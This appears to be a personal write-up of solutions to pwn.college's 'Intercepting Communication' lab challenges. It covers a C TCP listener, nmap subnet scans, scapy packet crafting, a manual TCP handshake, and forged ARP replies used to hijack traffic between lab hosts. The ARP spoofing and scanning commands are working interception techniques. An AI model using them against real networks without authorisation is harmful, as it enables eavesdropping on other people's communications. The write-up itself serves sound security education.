# Intercepting Communication

Learn various techniques to intercept and manipulate network communication, from connecting to remote hosts to performing man-in-the-middle attacks.

pwn.college [Intercepting Communication](https://pwn.college/intro-to-cybersecurity/intercepting-communication/)

## Listen to a port

The simplest method is to use netcat,

```sh
nc -l 31337
```

But I first did it with a C program,

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 1024

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    int port = atoi(argv[1]);
    if (port <= 0) {
        fprintf(stderr, "Invalid port number\n");
        exit(EXIT_FAILURE);
    }

    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    char buffer[BUFFER_SIZE] = {0};

    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Forcefully attaching socket to the port
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);

    // Bind the socket to the port
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    printf("Listening on port %d\n", port);

    // Accept an incoming connection
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
        perror("accept");
        close(server_fd);
        exit(EXIT_FAILURE);
    }

    // Receive data and print it
    int read_bytes;
    while ((read_bytes = read(new_socket, buffer, BUFFER_SIZE)) > 0) {
        printf("%.*s", read_bytes, buffer);
        memset(buffer, 0, BUFFER_SIZE);
    }

    if (read_bytes < 0) {
        perror("read");
    }

    // Close the connection
    close(new_socket);
    close(server_fd);

    return 0;
}
```

Compile the program with `gcc -o tcp_server tcp_server.c`

## Find a host on a network

In this challenge you will find and connect to a remote host. The remote host is somewhere on the `10.0.0.0/24` subnetwork, listening on port `31337`.

```sh
nmap -v -p 31337 10.0.0.0/24
nc 10.0.0.98 31337
```

## Find a hosts that are up on a large network

```sh
nmap -v --open -T4 -sn 10.0.0.0/16
```

 This took 2572 seconds. Others solve in less than two minutes so there is a quicker way to scan. 🤔

## Sending a custom packet to a remote host

Using [scapy](https://scapy.readthedocs.io/en/latest/index.html),

```python
src_mac=get_if_hwaddr("eth0")

pkt = Ether(type=0xFFFF, src=src_mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2", dst="10.0.0.3")/TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags="APRSF")

resp = sendp(pkt, iface="eth0", return_packets=True)
```

## TCP handshake

Manually perform a Transmission Control Protocol handshake. The initial packet should have `TCP sport=31337, dport=31337, seq=31337`. The handshake should occur with the remote host at `10.0.0.3`.

```python
# Get the MAC address of the ethernet interface
src_mac=get_if_hwaddr("eth0")

# Send the SYN packet
pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")/IP(src="10.0.0.2", dst="10.0.0.3")/TCP(sport=31337, dport=31337, seq=31337, flags="S")
resp = srp(pkt, iface="eth0")

# View the response
resp[0][0]
```

This displays the following,

```txt
QueryAnswer(
  query=<Ether  dst=ff:ff:ff:ff:ff:ff src=26:c2:81:a8:58:02 type=IPv4 |<IP  frag=0 proto=tcp src=10.0.0.2 dst=10.0.0.3 |<TCP  sport=31337 dport=31337 seq=31337 flags=S |>>>,
  answer=<Ether  dst=26:c2:81:a8:58:02 src=42:a8:e3:7b:b2:87 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=40 id=1 flags= frag=0 ttl=64 proto=tcp chksum=0x66cb src=10.0.0.3 dst=10.0.0.2 |<TCP  sport=31337 dport=31337 seq=2120348149 ack=31338 dataofs=5 reserved=0 flags=SA window=8192 chksum=0x9c39 urgptr=0 |>>>
)
```

Pull the `src=42:a8:e3:7b:b2:87` to use as the `dst` in the next `Ether` packet. Also pull `seq=2120348149` and `ack=31338` out of the response. We set our `ack` field to one plus their `seq` and our `seq` equal to their `ack`

```python
# Send the ACK Packet
pkt = Ether(src=src_mac, dst="42:a8:e3:7b:b2:87")/IP(src="10.0.0.2", dst="10.0.0.3")/TCP(sport=31337, dport=31337, seq=31338, ack=2120348150, flags="A")
sendp(pkt, iface="eth0")
```

## Send ARP packet

Manually send an Address Resolution Protocol packet. The packet should have `ARP op=is-at` and correctly inform the remote host of where the sender can be found. The packet should be sent to the remote host at `10.0.0.3`.

```python
sendp(Ether(src="26:0e:62:c0:25:8e", dst="ff:ff:ff:ff:ff:ff")/ARP(psrc="10.0.0.2", hwsrc="26:0e:62:c0:25:8e", op="is-at"), iface="eth0")
```

## Hijack traffic from a remote host using ARP

Hijack traffic from a remote host using ARP. You do not have the capabilities of a NET ADMIN. The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.2` on port `31337`.

First, set the IP address to that of the target machine,

```sh
ifconfig eth0 10.0.0.2 netmask 255.255.0.0
```

Then in `scapy`, send an ARP packet telling 10.0.0.4 that my machine is now 10.0.0.2 (same as previous level),

```python
sendp(Ether(src="26:0e:62:c0:25:8e", dst="ff:ff:ff:ff:ff:ff")/ARP(psrc="10.0.0.2", hwsrc="26:0e:62:c0:25:8e", op="is-at"), iface="eth0")
```

Finally, use netcat to listen on the port,

```sh
nc -l 31337
```
